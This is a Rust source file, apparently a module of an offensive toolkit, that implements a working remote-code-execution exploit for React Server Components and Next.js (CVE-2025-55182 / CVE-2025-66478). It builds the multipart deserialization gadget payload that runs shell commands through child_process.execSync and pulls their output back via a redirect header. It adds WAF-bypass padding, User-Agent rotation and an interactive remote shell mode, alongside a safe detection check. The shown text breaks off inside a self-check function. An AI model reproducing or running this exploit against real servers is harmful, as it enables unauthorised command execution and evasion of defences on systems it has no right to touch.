//! React Server Components RCE (CVE-2025-55182, CVE-2025-66478)
//!
//! Advanced implementation using the correct exploit chain with:
//! - Multi-chunk payload structure (5 chunks: 0-4)
//! - Gadget chain: $3:constructor:constructor â†’ Function()
//! - Output exfiltration via X-Action-Redirect header
//! - Safe-check mode for vulnerability detection without RCE
//! - Windows PowerShell support
//! - WAF bypass options
//!
//! Detects and exploits unauthenticated Remote Code Execution vulnerabilities in React Server Components
//! and Next.js through insecure deserialization in the RSC Flight protocol.
//!
//! References:
//! - https://nextjs.org/blog/CVE-2025-66478
//! - https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182
//! - https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive
//! - https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478/
//! - https://github.com/assetnote/react2shell-scanner

use anyhow::{anyhow, Context, Result};
use colored::*;
use rand::prelude::*;
use rand::rng;
use reqwest::Client;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};

const DEFAULT_TIMEOUT_SECS: u64 = 30;
const BOUNDARY: &str = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";

const BANNER: &str = r#"
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                                      â•‘
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘
â•‘  â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘
â•‘  â–ˆâ–ˆâ•‘     â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘
â•‘  â•šâ•â•      â•šâ•â•â•â•šâ•â•â• â•šâ•â•  â•šâ•â•â•â•    â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•   â•šâ•â•
â•‘                                                                      â•‘
â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•—                                â•‘
â•‘   â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘                               â•‘
â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘                               â•‘
â•‘   â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘                               â•‘
â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—                          â•‘
â•‘   â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•                          â•‘
â•‘                                                                      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•CVE-2025-55182 CVE-2025-66478 <-> React-Next.js RCEâ•â•â•â•â•â•â•â•â•
"#;

/// Exploit configuration
#[derive(Debug, Clone)]
pub struct ExploitConfig {
    pub target: String,
    pub proxy: Option<String>,
    pub verify_ssl: bool,
    pub verbose: bool,
    pub timeout: u64,
    pub custom_headers: Vec<(String, String)>,
    pub random_agent: bool,
    pub use_color: bool,
    pub windows_mode: bool,
    pub waf_bypass: bool,
    pub waf_bypass_size_kb: usize,
    pub target_path: String,
}

impl Default for ExploitConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            proxy: None,
            verify_ssl: true,
            verbose: false,
            timeout: DEFAULT_TIMEOUT_SECS,
            custom_headers: Vec::new(),
            random_agent: false,
            use_color: true,
            windows_mode: false,
            waf_bypass: false,
            waf_bypass_size_kb: 128,
            target_path: "/".to_string(),
        }
    }
}

/// Result of an exploit attempt
#[derive(Debug, Clone)]
pub struct ExploitResult {
    pub url: String,
    pub status: Option<u16>,
    pub vulnerable: bool,
    pub command_output: Option<String>,
    pub response_headers: Vec<(String, String)>,
    pub response_body: String,
}

const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
];

fn print_banner() {
    println!("{}", BANNER.red().bold());
}

fn get_random_user_agent() -> &'static str {
    let mut r = rng();
    USER_AGENTS.choose(&mut r).unwrap_or(&USER_AGENTS[0])
}

/// URL decode a string
fn url_decode(input: &str) -> String {
    let mut result = String::new();
    let mut chars = input.chars().peekable();
    
    while let Some(ch) = chars.next() {
        if ch == '%' {
            let hex: String = chars.by_ref().take(2).collect();
            if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                result.push(byte as char);
            } else {
                result.push('%');
                result.push_str(&hex);
            }
        } else if ch == '+' {
            result.push(' ');
        } else {
            result.push(ch);
        }
    }
    result
}

/// URL encode a string for use in JavaScript
fn js_encode(input: &str) -> String {
    input
        .replace('\\', "\\\\")
        .replace('\'', "\\'")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
}

/// Create the correct CVE-2025-55182 exploit payload
/// Based on Wiz Research verified PoC structure
/// 
/// Payload structure:
/// - Chunk 0: Entry point, references chunk 1
/// - Chunk 1: Fake chunk object with gadget references
/// - Chunk 2: Raw chunk reference ($@3) for Promise-like behavior
/// - Chunk 3: Empty array for constructor chain access
/// - Chunk 4: Response-like object with _prefix (code) and _formData.get (Function())
fn create_rce_payload(command: &str, is_windows: bool) -> String {
    // JavaScript code to execute shell command and return output via redirect
    // The output appears in X-Action-Redirect header as /login?a=<output>
    let js_code = if is_windows {
        format!(
            "var r=require('child_process').execSync('powershell -c \"{}\"').toString();throw new Error('/login?a='+encodeURIComponent(r))//",
            js_encode(command)
        )
    } else {
        format!(
            "var r=require('child_process').execSync('{}').toString();throw new Error('/login?a='+encodeURIComponent(r))//",
            js_encode(command)
        )
    };

    // Escape for JSON embedding
    let js_escaped = js_code.replace('\\', "\\\\").replace('"', "\\\"");

    // Chunk 1: Fake chunk object
    // - status: "resolved_model" makes the deserializer process it as a model
    // - reason: 0 is required
    // - _response: "$4" references our crafted response object
    // - value: JSON with "then" pointing to $3:map which triggers promise chain
    // - then: "$2:then" triggers the promise resolution
    let chunk_1 = r#"{"status":"resolved_model","reason":0,"_response":"$4","value":"{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}"#;

    // Chunk 2: Raw chunk reference - $@3 tells deserializer to treat as Promise
    let chunk_2 = "$@3";

    // Chunk 3: Empty array - used to access Array.constructor.constructor = Function()
    let chunk_3 = "[]";

    // Chunk 4: Response-like object
    // - _prefix: Our JavaScript code to execute
    // - _formData.get: Points to $3:constructor:constructor = Function()
    // - _chunks: Required for internal linkage
    let chunk_4 = format!(
        r#"{{"_prefix":"{}","_formData":{{"get":"$3:constructor:constructor"}},"_chunks":"$2:_response:_chunks"}}"#,
        js_escaped
    );

    // Build multipart body
    let mut body = String::new();
    
    // Chunk 0 - entry point
    body.push_str(&format!("------{}\r\n", BOUNDARY));
    body.push_str("Content-Disposition: form-data; name=\"0\"\r\n\r\n");
    body.push_str("$1\r\n");
    
    // Chunk 1 - fake chunk object
    body.push_str(&format!("------{}\r\n", BOUNDARY));
    body.push_str("Content-Disposition: form-data; name=\"1\"\r\n\r\n");
    body.push_str(chunk_1);
    body.push_str("\r\n");
    
    // Chunk 2 - raw chunk reference
    body.push_str(&format!("------{}\r\n", BOUNDARY));
    body.push_str("Content-Disposition: form-data; name=\"2\"\r\n\r\n");
    body.push_str(chunk_2);
    body.push_str("\r\n");
    
    // Chunk 3 - empty array
    body.push_str(&format!("------{}\r\n", BOUNDARY));
    body.push_str("Content-Disposition: form-data; name=\"3\"\r\n\r\n");
    body.push_str(chunk_3);
    body.push_str("\r\n");
    
    // Chunk 4 - response object with exploit
    body.push_str(&format!("------{}\r\n", BOUNDARY));
    body.push_str("Content-Disposition: form-data; name=\"4\"\r\n\r\n");
    body.push_str(&chunk_4);
    body.push_str("\r\n");
    
    // Terminating boundary
    body.push_str(&format!("------{}--", BOUNDARY));
    
    body
}

/// Create payload with WAF bypass (prepend junk data)
fn create_rce_payload_with_waf_bypass(command: &str, is_windows: bool, junk_size_kb: usize) -> String {
    let mut body = String::new();
    
    // Add junk data first to bypass WAF content inspection
    body.push_str(&format!("------{}\r\n", BOUNDARY));
    body.push_str("Content-Disposition: form-data; name=\"junk\"\r\n\r\n");
    body.push_str(&"x".repeat(junk_size_kb * 1024));
    body.push_str("\r\n");
    
    // Append the actual exploit payload (without initial boundary since we already have one)
    let exploit = create_rce_payload(command, is_windows);
    // Skip the first boundary from the exploit since we're appending
    if let Some(pos) = exploit.find("\r\n") {
        body.push_str(&exploit[pos + 2..]);
    } else {
        body.push_str(&exploit);
    }
    
    body
}

/// Create safe-check payload that triggers detectable error without RCE
/// This exploits the property resolution bug: {}.a.a -> undefined.a -> 500 error
fn create_safe_check_payload() -> String {
    let mut body = String::new();
    
    // Chunk 1 - empty object
    body.push_str(&format!("------{}\r\n", BOUNDARY));
    body.push_str("Content-Disposition: form-data; name=\"1\"\r\n\r\n");
    body.push_str("{}\r\n");
    
    // Chunk 0 - reference that causes undefined.a error
    body.push_str(&format!("------{}\r\n", BOUNDARY));
    body.push_str("Content-Disposition: form-data; name=\"0\"\r\n\r\n");
    body.push_str("[\"$1:a:a\"]\r\n");
    
    // Terminating boundary
    body.push_str(&format!("------{}--", BOUNDARY));
    
    body
}

/// Extract command output from X-Action-Redirect header
fn extract_output_from_redirect(headers: &[(String, String)]) -> Option<String> {
    for (name, value) in headers {
        if name.eq_ignore_ascii_case("x-action-redirect") {
            // Look for /login?a=<output> pattern
            if let Some(pos) = value.find("/login?a=") {
                let output = &value[pos + 9..];
                return Some(url_decode(output));
            }
            // Also check for just ?a= pattern
            if let Some(pos) = value.find("?a=") {
                let output = &value[pos + 3..];
                return Some(url_decode(output));
            }
        }
    }
    None
}

/// Check if response indicates vulnerability (for safe-check mode)
fn is_vulnerable_response(status: u16, body: &str) -> bool {
    // Vulnerable if: 500 status code AND body contains E{"digest"
    status == 500 && body.contains("E{\"digest\"")
}

/// Execute a command on the target
async fn execute_command(
    client: &Client,
    url: &str,
    command: &str,
    config: &ExploitConfig,
) -> Result<ExploitResult> {
    let body = if config.waf_bypass {
        create_rce_payload_with_waf_bypass(command, config.windows_mode, config.waf_bypass_size_kb)
    } else {
        create_rce_payload(command, config.windows_mode)
    };

    let user_agent = if config.random_agent {
        get_random_user_agent()
    } else {
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
    };

    let parsed_url = reqwest::Url::parse(url)?;
    let host = parsed_url.host_str()
        .map(|h| {
            if let Some(port) = parsed_url.port() {
                format!("{}:{}", h, port)
            } else {
                h.to_string()
            }
        })
        .unwrap_or_else(|| "localhost".to_string());

    let mut request = client.post(url)
        .header("Host", &host)
        .header("Content-Type", format!("multipart/form-data; boundary=----{}", BOUNDARY))
        .header("Next-Action", "x")
        .header("Next-Router-State-Tree", "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D")
        .header("X-Nextjs-Request-Id", "b5dce965")
        .header("X-Nextjs-Html-Request-Id", "SSTMXm7OJ_g0Ncx6jpQt9")
        .header("User-Agent", user_agent)
        .header("Accept", "*/*")
        .header("Accept-Language", "en-US,en;q=0.9");

    // Add custom headers
    for (key, value) in &config.custom_headers {
        request = request.header(key, value);
    }

    let response = request
        .body(body)
        .send()
        .await
        .context("Failed to send exploit request")?;

    let status = response.status().as_u16();
    
    // Collect headers
    let mut response_headers = Vec::new();
    for (name, value) in response.headers() {
        if let Ok(header_str) = value.to_str() {
            response_headers.push((name.to_string(), header_str.to_string()));
        }
    }

    let response_body = response.text().await.context("Failed to read response")?;

    // Extract output from X-Action-Redirect header
    let command_output = extract_output_from_redirect(&response_headers);
    
    // Check if vulnerable based on output or status
    let vulnerable = command_output.is_some() || is_vulnerable_response(status, &response_body);

    Ok(ExploitResult {
        url: url.to_string(),
        status: Some(status),
        vulnerable,
        command_output,
        response_headers,
        response_body,
    })
}

/// Safe vulnerability check (no RCE execution)
async fn safe_check_vulnerability(
    client: &Client,
    url: &str,
    config: &ExploitConfig,
) -> Result<ExploitResult> {
    let body = create_safe_check_payload();

    let user_agent = if config.random_agent {
        get_random_user_agent()
    } else {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
    };

    let parsed_url = reqwest::Url::parse(url)?;
    let host = parsed_url.host_str()
        .map(|h| {
            if let Some(port) = parsed_url.port() {
                format!("{}:{}", h, port)
            } else {
                h.to_string()
            }
        })
        .unwrap_or_else(|| "localhost".to_string());

    let mut request = client.post(url)
        .header("Host", &host)
        .header("Content-Type", format!("multipart/form-data; boundary=----{}", BOUNDARY))
        .header("Next-Action", "x")
        .header("Next-Router-State-Tree", "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D")
        .header("X-Nextjs-Request-Id", "b5dce965")
        .header("X-Nextjs-Html-Request-Id", "SSTMXm7OJ_g0Ncx6jpQt9")
        .header("User-Agent", user_agent);

    // Add custom headers
    for (key, value) in &config.custom_headers {
        request = request.header(key, value);
    }

    let response = request
        .body(body)
        .send()
        .await
        .context("Failed to send safe-check request")?;

    let status = response.status().as_u16();
    
    // Collect headers
    let mut response_headers = Vec::new();
    for (name, value) in response.headers() {
        if let Ok(header_str) = value.to_str() {
            response_headers.push((name.to_string(), header_str.to_string()));
        }
    }

    let response_body = response.text().await.context("Failed to read response")?;
    
    // Check if vulnerable: 500 status AND E{"digest" in body
    let vulnerable = is_vulnerable_response(status, &response_body);

    Ok(ExploitResult {
        url: url.to_string(),
        status: Some(status),
        vulnerable,
        command_output: None,
        response_headers,
        response_body,
    })
}

/// RCE verification using deterministic math operation
/// Executes 41*271 which should return 11111
async fn verify_rce(
    client: &Client,
    url: &str,
    config: &ExploitConfig,
) -> Result<ExploitResult> {
    let command = if config.windows_mode {
        "powershell -c \"41*271\""
    } else {
        "echo $((41*271))"
    };
    
    execute_command(client, url, command, config).await
}

fn print_result(result: &ExploitResult, config: &ExploitConfig) {
    println!("\n{}", "=".repeat(80));
    
    if config.use_color {
        println!("{}", format!("TARGET: {}", result.url).cyan().bold());
        if let Some(status) = result.status {
            println!("{}", format!("STATUS CODE: {}", status).yellow());
        }
    } else {
        println!("TARGET: {}", result.url);
        if let Some(status) = result.status {
            println!("STATUS CODE: {}", status);
        }
    }
    
    println!("{}", "=".repeat(80));

    if result.vulnerable {
        if config.use_color {
            println!("{}", "\nğŸ©¸ TARGET IS VULNERABLE!".red().bold());
            println!("{}", "CVE-2025-55182 / CVE-2025-66478 CONFIRMED".red().bold());
        } else {
            println!("\nğŸ©¸ TARGET IS VULNERABLE!");
            println!("CVE-2025-55182 / CVE-2025-66478 CONFIRMED");
        }

        if let Some(output) = &result.command_output {
            println!("\n{}", "-".repeat(60));
            if config.use_color {
                println!("{}", "COMMAND OUTPUT:".green().bold());
            } else {
                println!("COMMAND OUTPUT:");
            }
            println!("{}", "-".repeat(60));
            println!("{}", output);
            println!("{}", "-".repeat(60));
        }
    } else {
        if config.use_color {
            println!("{}", "\nâŒ Target does not appear to be vulnerable.".green());
        } else {
            println!("\nâŒ Target does not appear to be vulnerable.");
        }
    }

    if config.verbose {
        println!("\n{}", "RESPONSE HEADERS:".bold());
        for (key, value) in &result.response_headers {
            println!("  {}: {}", key, value);
        }
        
        println!("\n{}", format!("RESPONSE BODY ({} bytes):", result.response_body.len()).bold());
        if result.response_body.len() > 500 {
            println!("{}", &result.response_body[..500]);
            println!("... [truncated]");
        } else {
            println!("{}", result.response_body);
        }
    }
}

/// Interactive shell mode
async fn interactive_shell(client: &Client, url: &str, config: &ExploitConfig) -> Result<()> {
    println!("{}", "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—".cyan());
    println!("{}", "â•‘   INTERACTIVE SHELL MODE                                  â•‘".cyan());
    println!("{}", "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•".cyan());
    println!();
    println!("{}", "[*] Testing connection...".yellow());
    
    // Test with whoami/whoami
    let test_cmd = if config.windows_mode { "whoami" } else { "whoami" };
    let test_result = execute_command(client, url, test_cmd, config).await?;
    
    if !test_result.vulnerable {
        return Err(anyhow!("Target does not appear to be vulnerable. Cannot establish shell."));
    }
    
    let username = test_result.command_output
        .as_ref()
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "unknown".to_string());
    
    // Get current directory
    let pwd_cmd = if config.windows_mode { "cd" } else { "pwd" };
    let pwd_result = execute_command(client, url, pwd_cmd, config).await?;
    let current_dir = pwd_result.command_output
        .as_ref()
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "/".to_string());
    
    println!("{}", format!("[+] Connected! User: {}", username).green().bold());
    println!("{}", format!("[+] Directory: {}", current_dir).green());
    println!("{}", "[*] Type 'help' for commands, 'exit' to quit".cyan());
    println!();
    
    let parsed_url = reqwest::Url::parse(url)?;
    let hostname = parsed_url.host_str().unwrap_or("target");
    
    let stdin = tokio::io::stdin();
    let mut reader = BufReader::new(stdin);
    let mut line = String::new();
    let mut working_dir = current_dir;
    
    loop {
        print!("{}", format!("[{}@{}:{}]$ ", username, hostname, working_dir).green().bold());
        tokio::io::stdout()
            .flush()
            .await
            .context("Failed to flush stdout")?;
        
        line.clear();
        if reader.read_line(&mut line).await.is_err() {
            break;
        }
        
        let cmd = line.trim();
        
        if cmd.is_empty() {
            continue;
        }
        
        match cmd {
            "exit" | "quit" => {
                println!("{}", "[*] Exiting shell...".yellow());
                break;
            }
            "help" => {
                println!("\nAvailable commands:");
                println!("  help              Show this help");
                println!("  exit, quit        Exit the shell");
                println!("  clear             Clear the screen");
                println!("  <command>         Execute system command\n");
            }
            "clear" => {
                print!("\x1B[2J\x1B[1;1H");
                tokio::io::stdout()
                    .flush()
                    .await
                    .context("Failed to flush stdout")?;
            }
            cmd if cmd.starts_with("cd ") => {
                let target_dir = cmd[3..].trim();
                let cd_cmd = if config.windows_mode {
                    format!("cd {} && cd", target_dir)
                } else {
                    format!("cd {} && pwd", target_dir)
                };
                
                match execute_command(client, url, &cd_cmd, config).await {
                    Ok(result) if result.command_output.is_some() => {
                        let new_dir = result.command_output.unwrap();
                        let new_dir = new_dir.trim();
                        if !new_dir.contains("No such file") && !new_dir.contains("not found") {
                            working_dir = new_dir.to_string();
                            println!("{}", format!("Changed to: {}", working_dir).green());
                        } else {
                            println!("{}", format!("cd: {}: No such directory", target_dir).red());
                        }
                    }
                    _ => {
                        println!("{}", format!("cd: Failed to change directory").red());
                    }
                }
            }
            _ => {
                // Execute in working directory context
                let full_cmd = if config.windows_mode {
                    format!("cd {} && {}", working_dir, cmd)
                } else {
                    format!("cd {} && {}", working_dir, cmd)
                };
                
                match execute_command(client, url, &full_cmd, config).await {
                    Ok(result) => {
                        if let Some(output) = result.command_output {
                            print!("{}", output);
                            if !output.ends_with('\n') {
                                println!();
                            }
                        } else if result.vulnerable {
                            println!("{}", "[!] Command executed but no output".yellow());
                        } else {
                            println!("{}", "[!] Command may have failed".red());
                        }
                    }
                    Err(e) => {
                        println!("{}", format!("[-] Error: {}", e).red());
                    }
                }
            }
        }
    }
    
    Ok(())
}

/// Prompt helpers
async fn prompt(message: &str) -> Result<String> {
    print!("{}", format!("{}: ", message).cyan().bold());
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut input)
        .await
        .context("Failed to read input")?;
    Ok(input.trim().to_string())
}

async fn prompt_default(message: &str, default: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", message, default).cyan().bold());
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut input)
        .await
        .context("Failed to read input")?;
    let trimmed = input.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

async fn prompt_yes_no(message: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{}", format!("{} (y/n) [{}]: ", message, default_char).cyan().bold());
        tokio::io::stdout()
            .flush()
            .await
            .context("Failed to flush stdout")?;
        let mut input = String::new();
        tokio::io::BufReader::new(tokio::io::stdin())
            .read_line(&mut input)
            .await
            .context("Failed to read input")?;
        let trimmed = input.trim().to_lowercase();
        if trimmed.is_empty() {
            return Ok(default_yes);
        } else if trimmed == "y" || trimmed == "yes" {
            return Ok(true);
        } else if trimmed == "n" || trimmed == "no" {
            return Ok(false);
        } else {
            println!("{}", "Invalid input. Please enter 'y' or 'n'.".yellow());
        }
    }
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Normalize target URL
    let mut base_url = target.trim().to_string();
    if !base_url.starts_with("http://") && !base_url.starts_with("https://") {
        base_url = format!("http://{}", base_url);
    }
    let base_url = base_url.trim_end_matches('/').to_string();
    
    println!("{}", format!("[*] Target: {}", base_url).yellow());
    
    // Build configuration
    let mut config = ExploitConfig::default();
    config.target = base_url.clone();
    
    // Prompt for options
    config.verbose = prompt_yes_no("Verbose mode", false).await?;
    config.verify_ssl = !prompt_yes_no("Skip SSL verification", false).await?;
    config.random_agent = prompt_yes_no("Use random User-Agent", false).await?;
    config.windows_mode = prompt_yes_no("Windows target (use PowerShell)", false).await?;
    
    let timeout_str = prompt_default("Timeout (seconds)", "30").await?;
    config.timeout = timeout_str.parse().unwrap_or(30);
    
    // Target path
    config.target_path = prompt_default("Target path", "/").await?;
    
    // Proxy support
    let use_proxy = prompt_yes_no("Use proxy", false).await?;
    if use_proxy {
        let proxy_url = prompt("Proxy URL (e.g., http://127.0.0.1:8080)").await?;
        if !proxy_url.is_empty() {
            config.proxy = Some(proxy_url);
        }
    }
    
    // WAF bypass
    config.waf_bypass = prompt_yes_no("Enable WAF bypass (add junk data)", false).await?;
    if config.waf_bypass {
        let size_str = prompt_default("WAF bypass junk size (KB)", "128").await?;
        config.waf_bypass_size_kb = size_str.parse().unwrap_or(128);
    }
    
    // Custom headers
    let use_custom_headers = prompt_yes_no("Add custom headers", false).await?;
    if use_custom_headers {
        loop {
            let header_input = prompt("Header (Name: Value), or 'done'").await?;
            if header_input == "done" || header_input.is_empty() {
                break;
            }
            if let Some(colon_pos) = header_input.find(':') {
                let key = header_input[..colon_pos].trim().to_string();
                let value = header_input[colon_pos + 1..].trim().to_string();
                if !key.is_empty() && !value.is_empty() {
                    config.custom_headers.push((key, value));
                }
            }
        }
    }
    
    // Build HTTP client
    let mut client_builder = Client::builder()
        .timeout(Duration::from_secs(config.timeout))
        .danger_accept_invalid_certs(!config.verify_ssl);
    
    if let Some(proxy_url) = &config.proxy {
        let proxy = reqwest::Proxy::all(proxy_url)
            .context("Failed to create proxy")?;
        client_builder = client_builder.proxy(proxy);
    }
    
    let client = client_builder.build()
        .context("Failed to build HTTP client")?;
    
    let target_url = if config.target_path == "/" {
        base_url.clone()
    } else {
        format!("{}{}", base_url, config.target_path)
    };
    
    // Mode selection
    println!();
    println!("{}", "Select mode:".yellow().bold());
    println!("  1. Safe Vulnerability Check (no RCE)");
    println!("  2. RCE Verification (executes 41*271=11111)");
    println!("  3. Execute Single Command");
    println!("  4. Interactive Shell");
    println!("  5. Run Module Diagnostics");
    println!();
    
    let mode = prompt_default("Mode [1-5]", "1").await?;
    
    match mode.as_str() {
        "1" => {
            println!("{}", "[*] Running safe vulnerability check...".cyan());
            match safe_check_vulnerability(&client, &target_url, &config).await {
                Ok(result) => {
                    print_result(&result, &config);
                }
                Err(e) => {
                    println!("{}", format!("[-] Error: {}", e).red());
                }
            }
        }
        "2" => {
            println!("{}", "[*] Verifying RCE (executing 41*271)...".cyan());
            match verify_rce(&client, &target_url, &config).await {
                Ok(result) => {
                    if let Some(output) = &result.command_output {
                        if output.contains("11111") {
                            println!("{}", "\nâœ“ RCE VERIFIED! Output contains expected value 11111".green().bold());
                        }
                    }
                    print_result(&result, &config);
                }
                Err(e) => {
                    println!("{}", format!("[-] Error: {}", e).red());
                }
            }
        }
        "3" => {
            let command = prompt("Command to execute").await?;
            if command.is_empty() {
                return Err(anyhow!("Command cannot be empty"));
            }
            
            println!("{}", format!("[*] Executing: {}", command).cyan());
            match execute_command(&client, &target_url, &command, &config).await {
                Ok(result) => {
                    print_result(&result, &config);
                }
                Err(e) => {
                    println!("{}", format!("[-] Error: {}", e).red());
                }
            }
        }
        "4" => {
            interactive_shell(&client, &target_url, &config).await?;
        }
        "5" => {
            run_self_check();
        }
        _ => {
            return Err(anyhow!("Invalid mode selected"));
        }
    }
    
    Ok(())
}

fn run_self_check() {
    println!("{}", "\n[*] Running Module Self-Diagnostics...".cyan().bold());
    
    // Check 1: RCE Payload Creation
